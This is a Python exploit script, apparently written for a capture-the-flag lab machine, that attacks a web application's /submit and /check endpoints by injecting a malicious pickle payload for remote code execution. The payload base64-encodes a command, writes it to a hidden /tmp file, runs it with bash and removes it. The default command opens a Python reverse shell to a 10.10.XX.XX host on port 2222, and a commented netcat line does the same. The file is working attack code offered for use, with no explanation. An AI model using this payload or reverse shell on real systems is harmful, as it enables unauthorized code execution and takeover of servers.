#!/usr/bin/env python
# -*- coding: utf-8 -*-
# lightangel1412
import requests
import argparse
import base64
import sys
import random
import re
import cPickle
from hashlib import md5

#Lambda function for creating random string
random_string = lambda num: ''.join(random.choice("QWERTYUIOPASDFGHJKLXZCVBNMqwertyuiopasdfghjklzxcvbnm123456789012345678901234567890") for _ in range(num))
my_command = "cd /tmp && python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.XX.XX\",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
#my_command = "nc 10.10.XX.XX 2222"

#Main function
def main(url, command):
    filename = "."+random_string(20)+'.tmp'
    
    print('[+] Encoding Command')
    #So lets encode our user supplied command in base64 and write it to a string using the below struts vuln command with XML friendly characters.
    #we will save it to a file, execute that file with /bin/bash and then remove the temporary file
    encoded_command = 'echo+'+base64.b64encode(command)+'+%7C+base64+-d+%7C+tee+-a+%2Ftmp%2F'+filename+'+%3B+%2Fbin%2Fbash+%2Ftmp%2F'+filename+'+%3B+%2Fbin%2Frm+%2Ftmp%2F'+filename

    #encoded_command = 'echo+base64+%7C+base64+-d+%7C+tee+-a+%2Ftmp%2Fabc+%3B+%2Fbin%2Fbash+%2Ftmp%2Fabc+%3B+%2Fbin%2Fbash+%2Ftmp%2Fabc'

    payload = "cos%0Asystem%0A%28S%27" + encoded_command + "%27%0AtR.%27%0AtR.%0Ahomer"
    #payload = "cos\nsystem\n(S'nc 10.10.14.59 2222'\ntR.'\ntR.\nhomer"

    #Define some sample headers
    header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36','Content-Type': 'application/x-www-form-urlencoded'}

    char = "cos\nsystem\n(S'echo " + base64.b64encode(command) + " | base64 -d | tee -a /tmp/" + filename + " ; /bin/bash /tmp/" + filename + " ; /bin/rm /tmp/" + filename + "'\ntR.'\ntR.\nhomer"    
    #char = payload
    quote = 'p1'
    print('[++] Payload generated to insert into character value:' + char)

    print('[+] Making Post Request to store our payload with SUBMIT request')
    request_body = "character=" + payload + "&quote=" + quote
    request = requests.post(url+"/submit", data=request_body, headers=header)
    print('[++] Payload injected : ' + request_body + '\nResponse:' + request.text)

    print('[+] Making Post Request to execute our payload with CHECK request')
    p_id = md5(char + quote).hexdigest()
    request_body2 = "id=" + p_id
    request2 = requests.post(url+"/check", data=request_body2, headers=header)
    print('[++] Payload executed: ' + request_body2 + '\nResponse:' + request2.text)

if __name__ == "__main__":
    #to be improved later
    #main(args.url, args.command)
    main("http://10.10.10.70", my_command)
